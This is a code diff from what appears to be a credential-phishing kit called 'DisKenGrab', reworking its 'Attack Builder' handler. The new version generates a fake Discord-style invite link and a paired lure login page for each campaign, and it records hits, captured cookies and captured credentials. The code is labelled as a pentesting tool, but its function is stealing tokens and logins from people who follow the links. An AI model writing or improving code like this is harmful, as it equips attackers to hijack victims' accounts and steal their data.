@@ -1765,54 +1765,58 @@ body {
         }
 
         // ==================== ATTACK BUILDER ====================
-        document.getElementById('generateAttack').addEventListener('click', async function() {
-            const campaignName = document.getElementById('campaignName').value;
-            const targetInvite = document.getElementById('targetInvite').value;
-            const customMessage = document.getElementById('customMessage').value;
-            const enableCookies = document.getElementById('enableCookies').checked;
-            const enablePinCheck = document.getElementById('enablePinCheck').checked;
-            const spinner = document.getElementById('generateSpinner');
-            const urlDiv = document.getElementById('generatedUrl');
+document.getElementById('generateAttack').addEventListener('click', async function() {
+    const campaignName = document.getElementById('campaignName').value;
+    const targetInvite = document.getElementById('targetInvite').value;
+    const customMessage = document.getElementById('customMessage').value;
+    const enableCookies = document.getElementById('enableCookies').checked;
+    const enablePinCheck = document.getElementById('enablePinCheck').checked;
+    const spinner = document.getElementById('generateSpinner');
+    const urlDiv = document.getElementById('generatedUrl');
 
-            if (!campaignName || !targetInvite) {
-                alert('Please fill in campaign name and target invite URL');
-                return;
-            }
+    if (!campaignName || !targetInvite) {
+        alert('Please fill in campaign name and target invite URL');
+        return;
+    }
 
-            showLoading(this, spinner);
+    showLoading(this, spinner);
 
-            try {
-                // Generate unique attack URL
-                const attackId = generateId();
-                const attackUrl = `${window.location.origin}/DisKenGrab/attack.html?id=${attackId}&pentester=${currentUser.uid}`;
+    try {
+        // Generate unique attack URL with invite page
+        const attackId = generateId();
+        const inviteUrl = `${window.location.origin}/DisKenGrab/invite.html?id=${attackId}&pentester=${currentUser.uid}&invite=${encodeURIComponent(targetInvite)}`;
 
-                // Save campaign to database
-                await db.collection('campaigns').doc(attackId).set({
-                    name: campaignName,
-                    targetInvite: targetInvite,
-                    customMessage: customMessage,
-                    enableCookies: enableCookies,
-                    enablePinCheck: enablePinCheck,
-                    pentesterId: currentUser.uid,
-                    createdAt: firebase.firestore.FieldValue.serverTimestamp(),
-                    isActive: true,
-                    attackUrl: attackUrl
-                });
-
-                // Display generated URL
-                document.getElementById('attackUrl').textContent = attackUrl;
-                urlDiv.style.display = 'block';
-
-                // Log activity
-                await logActivity('campaign_created', `Created campaign: ${campaignName}`);
-
-            } catch (error) {
-                console.error('Error generating attack:', error);
-                alert('Error generating attack URL: ' + error.message);
-            } finally {
-                hideLoading(this, spinner);
-            }
+        // Save campaign to database
+        await db.collection('campaigns').doc(attackId).set({
+            name: campaignName,
+            targetInvite: targetInvite,
+            customMessage: customMessage,
+            enableCookies: enableCookies,
+            enablePinCheck: enablePinCheck,
+            pentesterId: currentUser.uid,
+            createdAt: firebase.firestore.FieldValue.serverTimestamp(),
+            isActive: true,
+            attackUrl: inviteUrl,
+            loginUrl: `${window.location.origin}/DisKenGrab/login.html?id=${attackId}&pentester=${currentUser.uid}`,
+            hits: 0,
+            cookiesCaptured: 0,
+            credentialsCaptured: 0
         });
+
+        // Display generated URL
+        document.getElementById('attackUrl').textContent = inviteUrl;
+        urlDiv.style.display = 'block';
+
+        // Log activity
+        await logActivity('campaign_created', `Created campaign: ${campaignName}`);
+
+    } catch (error) {
+        console.error('Error generating attack:', error);
+        alert('Error generating attack URL: ' + error.message);
+    } finally {
+        hideLoading(this, spinner);
+    }
+});
 
         // ==================== SETTINGS FUNCTIONALITY ====================
         document.getElementById('saveWebhook').addEventListener('click', async function() {
